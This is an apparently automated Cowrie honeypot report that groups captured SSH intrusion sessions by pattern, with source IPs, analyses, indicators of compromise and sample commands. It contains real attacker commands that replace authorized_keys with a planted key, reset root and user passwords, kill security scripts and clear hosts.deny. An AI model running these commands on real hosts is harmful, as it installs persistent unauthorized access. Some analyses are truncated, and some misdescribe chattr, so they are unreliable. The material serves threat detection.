echo -e "ollama\nWTULipbwQ18f\nWTULipbwQ18f"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "ollama\nWTULipbwQ18f\nWTULipbwQ18f\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: b6fa51f11520...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 82.27.116.55

#### Analysis

**Attack Type:** Backdoor / Botnet Recruitment  
**Objective:** Gain remote SSH access to the host and gather basic system information.  
**Techniques:**  
- Injected a custom SSH public key into `~/.ssh/authorized_keys` (chmoding permissions).  
- Attempted to change user passwords (`passwd`).  
- Executed reconnaissance commands: CPU info, memory usage, OS details, current user, crontab, etc.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **82.27.116.55** (Hong Kong).  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwd

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nV2sCKRUqDWYb\nV2sCKRUqDWYb"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nV2sCKRUqDWYb\nV2sCKRUqDWYb\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: ac4e2b9ed137...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 38.41.198.38

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain remote SSH access to the host while gathering system information for future exploitation or profiling.  

**Techniques & Tools Used:**  
- `chattr -ia .ssh` / `lockr -ia .ssh`: Make `.ssh` directory immutable and lock it, preventing tampering.  
- Creation of `.ssh` directory and injection of a public SSH key (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- Setting permissions to restrict group/others access (`chmod -R go= ~/.ssh`).  
- Attempted password changes via `passwd` piped with echo (likely to bypass interactive prompts).  
- System reconnaissance commands: CPU info, memory usage, disk space, process list, crontab, user identity, etc.  

**Indicators of Compromise (IOCs):**  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`.  
- Commands `lockr`, `chattr` (potentially custom or known tool).  

**Threat Level:** **High** – the attacker successfully installed a backdoor and performed detailed reconnaissance, indicating intent to gain persistent remote access.  

**Brief Summary:** The attacker injected an SSH key into the host’s `.ssh/authorized_keys`, secured the directory against tampering, and executed extensive system queries to gather information for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nS1kvnqOAIg6i\nS1kvnqOAIg6i"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nS1kvnqOAIg6i\nS1kvnqOAIg6i\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: a11f0344fedf...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 119.203.251.187

#### Analysis

**Attack Type:** Backdoor installation (remote SSH access)

**Objective:** Gain persistent remote control by injecting an SSH key and resetting the root password, enabling the attacker to log in as root.

**Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia`: attempt to hide or lock the `.ssh` directory.
- Creation of a new `.ssh/authorized_keys` file with a hard‑coded RSA public key.
- `chpasswd` to set the root password (`root:2YY5aybrASTB`).
- Killing processes (`pkill -9 secure.sh`, `auth.sh`, `sleep`) and clearing `/etc/hosts.deny`.
- System information gathering (CPU, memory, uname, top, etc.) for reconnaissance.

**Indicators of Compromise (IOCs):**
- Attacker IP: **119.203.251.187**  
- RSA public key string in `.ssh/authorized_keys` (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`) – can hash or match against known malicious keys.  
- File names referenced: `/tmp/secure.sh`, `/tmp/auth.sh`.  

**Threat Level:** **High** – the attacker has established root-level access and a persistent backdoor, posing significant risk.

**Brief Summary:** The session shows an attacker installing a hard‑coded SSH key and resetting the root password to create a remote backdoor, enabling full system control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:2YY5aybrASTB"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 4eae4de18a0c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 38.41.198.38

#### Analysis

**1. Attack Type:**  
Backdoor installation via SSH key injection (remote access setup).

**2. Objective:**  
Gain persistent, privileged remote access to the honeypot by installing an unauthorized SSH key.

**3. Techniques & Tools Used:**
- `chattr -ia` and `lockr -ia` to lock files.
- Removal of existing `.ssh`, creation of new directory, injection of a public‑key (`authorized_keys`) with a hard‑coded RSA key.
- Permission changes (`chmod -R go= ~/.ssh`).
- Attempts to change the local user password via `passwd`.
- System reconnaissance commands (e.g., `cat /proc/cpuinfo`, `free -m`, `uname`, `top`, `df -h`) to gather host details.

**4. Indicators of Compromise (IOCs):**
- **RSA Public Key:**  
`ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`
- **Command sequence** that modifies `.ssh` and sets permissions.
- Host information commands (CPU, memory, uname, etc.).

**5. Threat Level:**  
High – the attacker has successfully installed a malicious SSH key, enabling remote control; combined with system reconnaissance indicates potential for further exploitation.

**6. Brief Summary:**  
The attacker injected an unauthorized SSH key into the honeypot’s `.ssh` directory and attempted to change the local user password, while gathering host system details—effectively establishing a backdoor for future remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "ollama\nVwMO9zjfMaF4\nVwMO9zjfMaF4"|passwd|bash
Enter new UNIX password:
Enter new UNIX password: 
echo "ollama\nVwMO9zjfMaF4\nVwMO9zjfMaF4\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: b68b6717a7b5...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 177.55.243.168

#### Analysis

**1. Attack Type:**  
- **Backdoor / Remote Script Execution** – the attacker attempts to create a hidden file (`.s`) in `/dev/shm`, read it, and execute commands (likely a malicious script).

**2. Objective:**  
- Install or run an executable payload on the honeypot, possibly for future exploitation or botnet recruitment.

**3. Techniques & Tools Used:**
- `tftp` / `wget` – potential download of external content.
- `busybox` – used to execute a custom command (`JESWO`).
- `dd`, `cat`, `cp` – manipulation of files in shared memory.
- `while read i; do echo $i; done < .s` – reading and echoing the contents of `.s`.

**4. Indicators of Compromise (IOCs):**
- File name: `.s`
- Path: `/dev/shm/.s`
- Commands: `busybox JESWO`, `tftp`, `wget`
- Use of shared memory (`/dev/shm`) for hidden execution.

**5. Threat Level:** **Medium** – the attacker shows moderate sophistication (using hidden files and custom commands) but lacks evidence of large-scale exploitation or malware delivery.

**6. Brief Summary:**
The attacker created a hidden script in `/dev/shm`, attempted to download or execute it via `tftp`/`wget`, and then removed the file, indicating an attempt to install a backdoor or run a malicious payload on the honeypot.

#### Sample Commands
```
enable
system
system
shell
shell
sh
cat /proc/mounts; /bin/busybox JESWO
cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JESWO
tftp; wget; /bin/busybox JESWO
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
... (+5 more)
```

---

### Pattern: 2fd25cc75045...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 209.141.62.124

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote access to the host by creating an authorized SSH key and attempting to set a new password.  
**Techniques:**  
- Created/modified `.ssh` directory, set permissions (`chmod -R go= ~/.ssh`).  
- Injected a long RSA public key into `authorized_keys`.  
- Used `passwd` with piped input to attempt password changes.  
- Ran system‑info commands (cpuinfo, free, ls, crontab, uname, top) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- IP: 209.141.62.124  
- RSA key string in `authorized_keys` (the long “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”)  
- File paths: `.ssh/authorized_keys`, `/proc/cpuinfo`, `/etc/passwd` (via passwd).  

**Threat Level:** **High** – the attacker successfully installed a remote access backdoor, potentially enabling further exploitation.  

**Brief Summary:** The attacker injected a malicious SSH key and attempted to change user passwords, establishing a remote access backdoor while collecting system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "aryan123\na9nREMw16iGc\na9nREMw16iGc"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "aryan123\na9nREMw16iGc\na9nREMw16iGc\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: be5f0d4b9808...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 209.141.62.124

#### Analysis

**Attack Type:** Backdoor installation / Privilege escalation  
**Objective:** Gain persistent, privileged access to the system via SSH and root credentials.  

**Techniques Used:**  
- Injected an RSA public key into `~/.ssh/authorized_keys` (SSH key injection).  
- Reset the root password (`chpasswd`).  
- Altered file permissions (`chmod -R go= ~/.ssh`) and locked files (`lockr`).  
- Attempted to kill or disable processes (`pkill -9 …`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **209.141.62.124**  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: **SMz0NGh1pWEm**  

**Threat Level:** High – attacker achieved root-level access and installed a persistent backdoor.  

**Brief Summary:** The attacker injected an SSH key, reset the root password, and attempted to disable certain processes, effectively establishing a privileged backdoor for remote control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:SMz0NGh1pWEm"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 88f6ebe075d5...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 36.255.3.203

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential theft (remote SSH access)

**2. Objective:**  
Gain persistent remote control of the honeypot by injecting a valid SSH public key into `~/.ssh/authorized_keys` and securing it with restrictive permissions.

**3. Techniques & Tools Used:**
- File attribute manipulation (`chattr`, `lockr`) to prevent tampering.
- Permission changes (`chmod -R go= ~/.ssh`) to lock the directory.
- Direct injection of an RSA public key via `echo … > .ssh/authorized_keys`.
- System reconnaissance commands (CPU, memory, OS info) to gather host details.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **36.255.3.203**  
- RSA public key string (the long base‑64 encoded key in the `echo` command).  
- File path: `~/.ssh/authorized_keys`

**5. Threat Level:** High – attacker is establishing a persistent remote access point, potentially enabling further exploitation.

**6. Brief Summary:**  
The attacker injected an SSH public key into the honeypot’s authorized keys file, secured it with restrictive permissions, and performed system reconnaissance to gather host details, effectively creating a backdoor for future remote control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "cy123\nT44hwEs3wjyy\nT44hwEs3wjyy"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "cy123\nT44hwEs3wjyy\nT44hwEs3wjyy\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: c6ec2cef3ab3...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 194.226.49.149

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection (remote access setup)

**Objective:**  
Gain persistent SSH access to the host and gather system information for further exploitation or monitoring.

**Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia` to set immutable attributes on `.ssh` directory, hiding it from normal operations.
- Creation of `.ssh/authorized_keys` with a custom RSA key.
- Permission changes (`chmod -R go= ~/.ssh`) to restrict access.
- Use of `passwd` to attempt password change (likely for user account manipulation).
- System reconnaissance commands: `cat /proc/cpuinfo`, `free -m`, `ls`, `crontab -l`, `uname`, `whoami`, `lscpu`, `df`.

**Indicators of Compromise (IOCs):**
- Attacker IP: **194.226.49.149**  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun..."` (full key can be hashed for detection).  
- File path: `~/.ssh/authorized_keys`  
- Immutable attribute usage (`chattr -ia`, `lockr -ia`) on `.ssh`.

**Threat Level:** **High** – the attacker has installed a backdoor and collected detailed system info, enabling remote control.

**Brief Summary:**  
The attacker injected an SSH key into the host’s authorized keys, set immutable attributes to conceal the directory, and performed extensive system reconnaissance, aiming to establish persistent remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "dev@2025\nZUy4JO5c3jXi\nZUy4JO5c3jXi"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "dev@2025\nZUy4JO5c3jXi\nZUy4JO5c3jXi\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: eb609bb90e9f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 145.239.85.111

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection + reconnaissance  

**Objective:** Gain remote access by adding a new SSH key to the honeypot’s `authorized_keys` file and attempting to create or modify user credentials; gather system information for future exploitation.  

**Techniques:**
- Use of `chattr -ia /lockr -ia .ssh` to make the `.ssh` directory immutable, preventing tampering.
- Removal and recreation of `.ssh`, then echoing a public SSH key into `authorized_keys`.
- Setting permissions with `chmod -R go= ~/.ssh`.
- Attempted password changes via `passwd` commands (echoing passwords).
- System‑info gathering (`cpuinfo`, `free`, `ls`, `uname`, `top`, etc.) to profile the host.

**Indicators of Compromise (IOCs):**
- Attacker IP: **145.239.85.111**  
- Public SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `.ssh/authorized_keys`

**Threat Level:** Medium – the attacker demonstrates moderate sophistication (immutable file manipulation, SSH key injection) but lacks evidence of further exploitation or payload deployment.

**Brief Summary:** The attacker injected a new SSH public key into the honeypot’s `authorized_keys` and attempted to set user credentials while collecting system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nnyM94mpqNQoX\nnyM94mpqNQoX"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\nnyM94mpqNQoX\nnyM94mpqNQoX\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 2036f8cdc79e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 150.5.169.138

#### Analysis

**Attack Type:** Backdoor installation / botnet recruitment  
**Objective:** Gain remote SSH access to the honeypot and gather system information for future use.  

**Techniques Used:**  
- **File manipulation & protection** (`chattr -ia`, `lockr -ia`) to hide the `.ssh` directory.  
- **SSH key injection**: echoing a hard‑coded RSA public key into `authorized_keys`.  
- **Permission changes** (`chmod -R go= ~/.ssh`).  
- **System reconnaissance** (CPU, memory, disk usage, OS info).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 150.5.169.138 (Hong Kong)  
- RSA public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File paths: `~/.ssh/authorized_keys`, `~/.ssh`.  

**Threat Level:** Medium – the attacker successfully installed a backdoor and collected system data, but no payload download or cryptomining activity was observed.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory to establish remote access while gathering basic system information for potential future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "game\n4UmHe95wb57O\n4UmHe95wb57O"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "game\n4UmHe95wb57O\n4UmHe95wb57O\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 241c7e17e81f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 210.79.190.151

#### Analysis

**1. Attack Type:**  
Backdoor installation with reconnaissance – the attacker injects an SSH key to gain remote control, then gathers system information for future use (

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nwHLydG9qhd02\nwHLydG9qhd02"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\nwHLydG9qhd02\nwHLydG9qhd02\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 37a61a823683...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.142.49

#### Analysis

**Attack Type:** Backdoor installation / credential hijacking  
**Objective:** Gain unrestricted SSH access (root privileges) on the honeypot.  
**Techniques:**  
- **SSH key injection** – created a new `.ssh/authorized_keys` file with a hard‑coded RSA key.  
- **Root password reset** – used `chpasswd` to set root password (`ajtOUGSQ5asu`).  
- **Process suppression** – killed potential monitoring scripts (`secure.sh`, `auth.sh`, `sleep`) and wrote to `/etc/hosts.deny`.  
- **System reconnaissance** – executed various CPU, memory, and system info commands (e.g., `cat /proc/cpuinfo`, `free -m`, `uname`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.142.49** (Singapore)  
- SSH key string in `/ssh/authorized_keys`: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `ajtOUGSQ5asu`

**Threat Level:** **High** – attacker achieved full root access and installed a persistent backdoor.  

**Brief Summary:** The attacker injected an SSH key and reset the root password on the honeypot, enabling unrestricted remote control and potential persistence.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ajtOUGSQ5asu"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 6961d5fb616a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 68.233.116.124

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection with reconnaissance.  
**Objective:** Gain remote access (SSH) and gather system information for future exploitation or further attacks.  
**Techniques:**  
- `chattr -ia` / `lockr -ia` to set immutable attributes on `.ssh`.  
- Removal, recreation of `.ssh`, insertion of a malicious SSH key (`authorized_keys`).  
- `chmod go=` to restrict permissions.  
- Attempts to change the user password via `passwd`.  
- System‑info commands (cpuinfo, memory, ls, crontab, uname, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **68.233.116.124** (India).  
- SSH key string:

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1234\nngVq8lJnxZFv\nngVq8lJnxZFv"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1234\nngVq8lJnxZFv\nngVq8lJnxZFv\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 19c969ebd25b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 218.37.207.187

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection with subsequent system reconnaissance (possible botnet recruitment).

**Objective:**  
Establish persistent remote access by adding an authorized SSH key and creating a new user, then gather detailed system information to facilitate further exploitation or monitoring.

**Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia` – attempt to make the `.ssh` directory immutable.
- Removal and recreation of `.ssh`, insertion of a public SSH key (`authorized_keys`).
-

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "centos\nHV3l7sYJpQcj\nHV3l7sYJpQcj"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "centos\nHV3l7sYJpQcj\nHV3l7sYJpQcj\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 6bd6b066619a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.194.199

#### Analysis

**Attack Type:**  
Backdoor installation / privilege escalation (likely part of a bot‑net or malicious remote control).

**Objective:**  
